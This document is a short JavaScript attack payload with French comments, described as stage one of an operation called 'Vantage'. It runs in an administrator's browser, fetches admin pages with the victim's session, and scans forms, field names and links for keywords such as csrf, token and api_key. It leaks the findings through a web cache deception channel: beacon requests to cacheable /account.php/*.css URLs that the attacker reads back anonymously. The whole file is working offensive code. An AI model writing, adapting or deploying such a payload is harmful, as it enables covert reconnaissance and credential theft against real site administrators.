/* Vantage - etape 1 : reconnaissance de la console admin.
   Canal de retour : chaque "beacon" force le navigateur du reviewer a demander
   une URL /account.php/<nom>.css, que l'edge met alors en cache et que nous
   pouvons relire anonymement. Le vocabulaire est fixe d'avance, donc enumerable. */
(function () {
  var ID = 'v1';
  function beacon(tag) {
    try { new Image().src = '/account.php/' + ID + '_' + tag + '.css?_=' + Math.random(); } catch (e) {}
  }
  beacon('exec');

  var KW = ['pages','page','edit','save','update','publish','content','body','path',
            'home','banner','seize','notice','csrf','token','api_key','textarea',
            'slug','title','html','queue','tip','approve','reject','render','file'];

  function probe(url, prefix) {
    fetch(url, { credentials: 'include' })
      .then(function (r) { beacon(prefix + 's' + r.status); return r.text(); })
      .then(function (h) {
        var low = h.toLowerCase();
        KW.forEach(function (k, i) { if (low.indexOf(k) >= 0) beacon(prefix + 'k' + i); });
        var d = new DOMParser().parseFromString(h, 'text/html');
        d.querySelectorAll('form').forEach(function (f, i) {
          if (i > 3) return;
          beacon(prefix + 'f' + i + 'm' + (f.getAttribute('method') || 'get').toLowerCase());
          KW.forEach(function (k, j) {
            if ((f.getAttribute('action') || '').toLowerCase().indexOf(k) >= 0) beacon(prefix + 'f' + i + 'a' + j);
          });
          f.querySelectorAll('input,textarea,select').forEach(function (el) {
            KW.forEach(function (k, j) {
              if ((el.getAttribute('name') || '').toLowerCase().indexOf(k) >= 0) beacon(prefix + 'f' + i + 'n' + j);
            });
          });
        });
        d.querySelectorAll('a[href]').forEach(function (a) {
          KW.forEach(function (k, j) {
            if (a.getAttribute('href').toLowerCase().indexOf(k) >= 0) beacon(prefix + 'h' + j);
          });
        });
      })
      .catch(function () { beacon(prefix + 'err'); });
  }

  probe('/admin/review.php', 'r');
  probe('/admin/index.php', 'i');
})();
